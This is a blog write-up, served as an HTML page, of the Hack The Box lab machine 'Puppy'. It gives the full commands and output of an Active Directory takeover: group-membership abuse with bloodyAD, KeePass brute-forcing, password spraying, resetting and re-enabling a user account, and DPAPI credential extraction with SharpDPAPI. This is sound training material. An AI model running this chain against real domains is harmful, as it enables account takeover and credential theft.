@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Windows - Medium - Puppy - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Windows - Medium - Puppy</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1747591084239"
+                  >2025-05-18 19:58</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1747781350799"
+                  >2025-05-21 00:49</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>We start the box with creds <code>levi.james / KingofAkron2025!</code>. Running nmap scan finds us <code>puppy.htb</code> domain. Login gives us shares on smb.</p>
+<div><pre class="hljs"><code><span class="hljs-comment">└──╼</span> <span class="hljs-comment">$smbclient</span> <span class="hljs-literal">-</span><span class="hljs-comment">L</span> <span class="hljs-comment">//puppy</span><span class="hljs-string">.</span><span class="hljs-comment">htb</span> <span class="hljs-literal">-</span><span class="hljs-comment">U</span> <span class="hljs-comment">levi</span><span class="hljs-string">.</span><span class="hljs-comment">james</span> --<span class="hljs-comment">password=KingofAkron2025!</span>
+
+    <span class="hljs-comment">Sharename</span>       <span class="hljs-comment">Type</span>      <span class="hljs-comment">Comment</span>
+    --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>       --<span class="hljs-literal">-</span><span class="hljs-literal">-</span>      --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
+    <span class="hljs-comment">ADMIN$</span>          <span class="hljs-comment">Disk</span>      <span class="hljs-comment">Remote</span> <span class="hljs-comment">Admin</span>
+    <span class="hljs-comment">C$</span>              <span class="hljs-comment">Disk</span>      <span class="hljs-comment">Default</span> <span class="hljs-comment">share</span>
+    <span class="hljs-comment">DEV</span>             <span class="hljs-comment">Disk</span>      <span class="hljs-comment">DEV</span><span class="hljs-literal">-</span><span class="hljs-comment">SHARE</span> <span class="hljs-comment">for</span> <span class="hljs-comment">PUPPY</span><span class="hljs-literal">-</span><span class="hljs-comment">DEVS</span>
+    <span class="hljs-comment">IPC$</span>            <span class="hljs-comment">IPC</span>       <span class="hljs-comment">Remote</span> <span class="hljs-comment">IPC</span>
+    <span class="hljs-comment">NETLOGON</span>        <span class="hljs-comment">Disk      Logon server share </span>
+    <span class="hljs-comment">SYSVOL</span>          <span class="hljs-comment">Disk      Logon server share </span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>       <span class="hljs-string">VERSION</span>
+<span class="hljs-number">53</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>        <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span>
+<span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2025-05-19 00:52:56Z</span><span class="hljs-string">)</span>
+<span class="hljs-number">111</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">rpcbind</span>       <span class="hljs-number">2</span><span class="hljs-number">-4</span> <span class="hljs-string">(RPC</span> <span class="hljs-comment">#100000)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">rpcinfo:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-string">program</span> <span class="hljs-string">version</span>    <span class="hljs-string">port/proto</span>  <span class="hljs-string">service</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span><span class="hljs-string">,3,4</span>        <span class="hljs-number">111</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">rpcbind</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span><span class="hljs-string">,3,4</span>        <span class="hljs-number">111</span><span class="hljs-string">/tcp6</span>  <span class="hljs-string">rpcbind</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span><span class="hljs-string">,3,4</span>        <span class="hljs-number">111</span><span class="hljs-string">/udp</span>   <span class="hljs-string">rpcbind</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span><span class="hljs-string">,3,4</span>        <span class="hljs-number">111</span><span class="hljs-string">/udp6</span>  <span class="hljs-string">rpcbind</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100003</span>  <span class="hljs-number">2</span><span class="hljs-string">,3</span>         <span class="hljs-number">2049</span><span class="hljs-string">/udp</span>   <span class="hljs-string">nfs</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100003</span>  <span class="hljs-number">2</span><span class="hljs-string">,3</span>         <span class="hljs-number">2049</span><span class="hljs-string">/udp6</span>  <span class="hljs-string">nfs</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100005</span>  <span class="hljs-number">1</span><span class="hljs-string">,2,3</span>       <span class="hljs-number">2049</span><span class="hljs-string">/udp</span>   <span class="hljs-string">mountd</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100005</span>  <span class="hljs-number">1</span><span class="hljs-string">,2,3</span>       <span class="hljs-number">2049</span><span class="hljs-string">/udp6</span>  <span class="hljs-string">mountd</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span><span class="hljs-string">,2,3,4</span>     <span class="hljs-number">2049</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">nlockmgr</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span><span class="hljs-string">,2,3,4</span>     <span class="hljs-number">2049</span><span class="hljs-string">/tcp6</span>  <span class="hljs-string">nlockmgr</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span><span class="hljs-string">,2,3,4</span>     <span class="hljs-number">2049</span><span class="hljs-string">/udp</span>   <span class="hljs-string">nlockmgr</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100021</span>  <span class="hljs-number">1</span><span class="hljs-string">,2,3,4</span>     <span class="hljs-number">2049</span><span class="hljs-string">/udp6</span>  <span class="hljs-string">nlockmgr</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">status</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span><span class="hljs-string">/tcp6</span>  <span class="hljs-string">status</span>
+<span class="hljs-string">|</span>   <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span><span class="hljs-string">/udp</span>   <span class="hljs-string">status</span>
+<span class="hljs-string">|_</span>  <span class="hljs-number">100024</span>  <span class="hljs-number">1</span>           <span class="hljs-number">2049</span><span class="hljs-string">/udp6</span>  <span class="hljs-string">status</span>
+<span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span>
+<span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">PUPPY.HTB0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds?</span>
+<span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span>
+<span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span>
+<span class="hljs-number">2049</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">nlockmgr</span>      <span class="hljs-number">1</span><span class="hljs-number">-4</span> <span class="hljs-string">(RPC</span> <span class="hljs-comment">#100021)</span>
+<span class="hljs-number">3260</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">iscsi?</span>
+<span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">PUPPY.HTB0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-number">3269</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span>
+<span class="hljs-number">5985</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span>
+<span class="hljs-number">9389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">mc-nmf</span>        <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span>
+<span class="hljs-number">49664</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49667</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49669</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49670</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">49685</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">64082</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">64096</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">DC;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span>
+
+<span class="hljs-attr">Host script results:</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2025-05-19T00:54:44</span>
+<span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-string">N/A</span>
+<span class="hljs-string">|_clock-skew:</span> <span class="hljs-string">6h59m42s</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">3:1:1:</span> 
+<span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span></code></pre></div>
+<p>We can dump everything to bloodhound.<br />
+<code>vpy3 ~/vpy/bin/bloodhound-python -u levi.james -p KingofAkron2025! -d puppy.htb -c all -ns 10.129.4.17</code></p>
+<h1 id="user">User</h1>
+<p>After inspection, we can see that we have <code>GenericWrite</code> over <code>Developers</code> group.</p>
+<p><img src="/_resources/ace7641f907741328ac711e098532f38.png" /></p>
+<p>We can then add ourselves to the developers group with <code>bloodyAD</code>.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$vpy3</span> ~/vpy/bin/bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">4.17</span> -d PUPPY<span class="hljs-selector-class">.HTB</span> -u levi<span class="hljs-selector-class">.james</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'KingofAkron2025!'</span> add groupMember DEVELOPERS <span class="hljs-string">"CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB"</span>
+<span class="hljs-selector-attr">[+]</span> levi<span class="hljs-selector-class">.james</span> added to DEVELOPERS</code></pre></div>
+<p>We can then download everything from the <code>\dev</code> share.</p>
+<div><pre class="hljs"><code>└──╼ $smbclient //10.129.4.17/DEV -U "PUPPY\\levi.james%KingofAkron2025!"
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DR       <span class="hljs-number"> 0 </span> Sun Mar<span class="hljs-number"> 23 </span>07:07:57 2025
+  ..                                  D       <span class="hljs-number"> 0 </span> Sat Mar <span class="hljs-number"> 8 </span>16:52:57 2025
+  KeePassXC-2.7.9-Win64.msi           A<span class="hljs-number"> 34394112 </span> Sun Mar<span class="hljs-number"> 23 </span>07:09:12 2025
+  Projects                            D       <span class="hljs-number"> 0 </span> Sat Mar <span class="hljs-number"> 8 </span>16:53:36 2025
+  recovery.kdbx                       A    <span class="hljs-number"> 2677 </span> Wed Mar<span class="hljs-number"> 12 </span>02:25:46 2025
+
+       <span class="hljs-number"> 5080575 </span>blocks of size 4096.<span class="hljs-number"> 1543239 </span>blocks available
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *</code></pre></div>
+<p>I tried getting the hash for john, but this version of keepass is too new.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$sudo</span> <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/keepass2john ./</span>recovery.kdbx
+! ./recovery.kdbx : File version <span class="hljs-string">'40000'</span> is currently not supported!</code></pre></div>
+<p>We can however crack the pass with <a title="https://raw.githubusercontent.com/r3nt0n/keepass4brute/refs/heads/master/keepass4brute.sh" href="https://raw.githubusercontent.com/r3nt0n/keepass4brute/refs/heads/master/keepass4brute.sh">keepass4brute</a></p>
+<div><pre class="hljs"><code>└──╼ $.<span class="hljs-regexp">/keepass4brute.sh recovery.kdbx /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/seclists/</span>Passwords/xato-net-<span class="hljs-number">10</span>-million-passwords.txt 
+keepass4brute <span class="hljs-number">1.3</span> by r3nt0n
+https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/r3nt0n/</span>keepass4brute
+
+[+] Words tested: <span class="hljs-number">345</span>/<span class="hljs-number">5189454</span> - Attempts per minute: <span class="hljs-number">144</span> - Estimated time remaining: <span class="hljs-number">3</span> weeks, <span class="hljs-number">4</span> days
+[+] Current attempt: liverpool
+
+[*] Password found: liverpool</code></pre></div>
+<p><img src="/_resources/36f9a938438144f4883acf5bc67db170.png" /></p>
+<p>We can get all users from bloodhound and then test all new passwords with crackmapexec.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$crackmapexec</span> smb puppy<span class="hljs-selector-class">.htb</span> -u users -<span class="hljs-selector-tag">p</span> passwords <span class="hljs-attr">--continue-on-success</span>
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">4.17</span>     <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[+]</span> PUPPY.HTB\ANT<span class="hljs-selector-class">.EDWARDS</span>:Antman2025! </code></pre></div>
+<p>With that account we finally get a path to the admin.</p>
+<p><img src="/_resources/e80672fa8347470e9d053481d7fe427f.png" /></p>
+<p>We can change Adam’s password.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$vpy3</span> ~/vpy/bin/bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">4.17</span> -d PUPPY<span class="hljs-selector-class">.HTB</span> -u ANT<span class="hljs-selector-class">.EDWARDS</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'Antman2025!'</span> set password adam<span class="hljs-selector-class">.silver</span> <span class="hljs-string">'Password1!'</span>
+<span class="hljs-selector-attr">[+]</span> Password changed successfully!</code></pre></div>
+<p>We cannot log in yet, as the account is disabled.</p>
+<p><img src="/_resources/a9e75223251442b3824313fd4ea73941.png" /></p>
+<p>We can enable it with BloodyAD</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$vpy3</span> ~/vpy/bin/bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">4.17</span> \
+  -d PUPPY<span class="hljs-selector-class">.HTB</span> -u ANT<span class="hljs-selector-class">.EDWARDS</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'Antman2025!'</span> \
+  remove uac adam<span class="hljs-selector-class">.silver</span> -f ACCOUNTDISABLE
+<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-attr">[<span class="hljs-string">'ACCOUNTDISABLE'</span>]</span> property flags removed from adam.silver<span class="hljs-string">'s userAccountControl</span></code></pre></div>
+<p>We are finally in.</p>
+<p><img src="/_resources/3f7191df31df409c8fc352c41aad58a9.png" /></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>When checked again, there seems to be an error in bloodhound’s diagnosis and adam cannot perform dcsync. That’s not a problem as on the machine we can find <code>C:\backups</code>. After download and extraction we can find <code>nms-auth-config.xml.bak</code>.</p>
+<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">snip</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">server</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">host</span>&gt;</span>DC.PUPPY.HTB<span class="hljs-tag">&lt;/<span class="hljs-name">host</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span>389<span class="hljs-tag">&lt;/<span class="hljs-name">port</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">base-dn</span>&gt;</span>dc=PUPPY,dc=HTB<span class="hljs-tag">&lt;/<span class="hljs-name">base-dn</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">bind-dn</span>&gt;</span>cn=steph.cooper,dc=puppy,dc=htb<span class="hljs-tag">&lt;/<span class="hljs-name">bind-dn</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">bind-password</span>&gt;</span>ChefSteph2025!<span class="hljs-tag">&lt;/<span class="hljs-name">bind-password</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">snip</span>&gt;</span></code></pre></div>
+<p>Looking back at bloodhound we can learn taht steph cooper also has another account with admin rights.</p>
+<p><img src="/_resources/bb523ab9b29e4d228b7b22b2f642ec9d.png" /></p>
+<p>Running <code>seatbelt.exe -group user</code> we can find DPAPI creds.</p>
+<div><pre class="hljs"><code><span class="hljs-section">====== DpapiMasterKeys ======</span>
+
+<span class="hljs-code">  Folder : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107</span>
+
+<span class="hljs-code">    LastAccessed              LastModified              FileName</span>
+<span class="hljs-code">    ------------              ------------              --------</span>
+<span class="hljs-code">    3/8/2025 7:40:36 AM       3/8/2025 7:40:36 AM       556a2412-1275-4ccf-b721-e6a0b4f90407</span>
+
+
+<span class="hljs-code">  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt</span>
+<span class="hljs-code">  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module</span>
+<span class="hljs-code">  [*] You can also use SharpDPAPI for masterkey retrieval.</span></code></pre></div>
+<p>So using SharpDPAPI we can get the masterkey.</p>
+<div><pre class="hljs"><code>.\SharpDPAPI.exe masterkeys /password:ChefSteph2025!
+[*] <span class="hljs-keyword">User</span> <span class="hljs-title">master</span> key cache:
+
+{<span class="hljs-number">556</span>a2412-<span class="hljs-number">1275</span>-<span class="hljs-number">4</span>ccf-b721-e6a0b4f90407}:<span class="hljs-number">4</span>BE520BECFFF09F17E45269C9156768EE03609CE</code></pre></div>
+<p>We cam then find encrypted files using <code>.\SharpDPAPI.exe triage /password:"ChefSteph2025!"</code></p>
+<div><pre class="hljs"><code>Folder       : <span class="hljs-name">C</span>:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\
+Folder       : <span class="hljs-name">C</span>:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\
+Vault <span class="hljs-name">folder</span>: <span class="hljs-name">C</span>:\Users\steph.cooper\AppData\Local\Microsoft\Vault\<span class="hljs-number">4</span>BF4C442<span class="hljs-number">-9</span>B8A<span class="hljs-number">-41</span>A0-B380-DD4A704DDB28
+Folder       : <span class="hljs-name">C</span>:\Users\steph.cooper\AppData\Roaming\Microsoft\Crypto\Keys\</code></pre></div>
+<p>Then we get creds:</p>
+<div><pre class="hljs"><code> CREDENTIAL
+ LastWritten : 2025-03-08 15:54:29
+ Flags       : 0<span class="hljs-type">x00000030</span> (CRED_FLAGS_REQUIRE_CONFIRMATIONùCRED_FLAGS_WILDCARD_MATCH)
+ Persist     : 0<span class="hljs-type">x00000003</span> (CRED_PERSIST_ENTERPRISE)
+ <span class="hljs-keyword">Type</span>        <span class="hljs-type">: </span><span class="hljs-number">0</span>x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+ Target      : <span class="hljs-type">Domain</span>:target=PUPPY.HTB
+ Description :
+ <span class="hljs-type">Unknown</span>     :
+ <span class="hljs-type">Username</span>    : <span class="hljs-type">steph.cooper_adm</span>
+ Unknown     : <span class="hljs-type">FivethChipOnItsWay2025</span>!</code></pre></div>
+<p>We get access to <code>C:\Users\Administrator\Desktop</code>, end.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
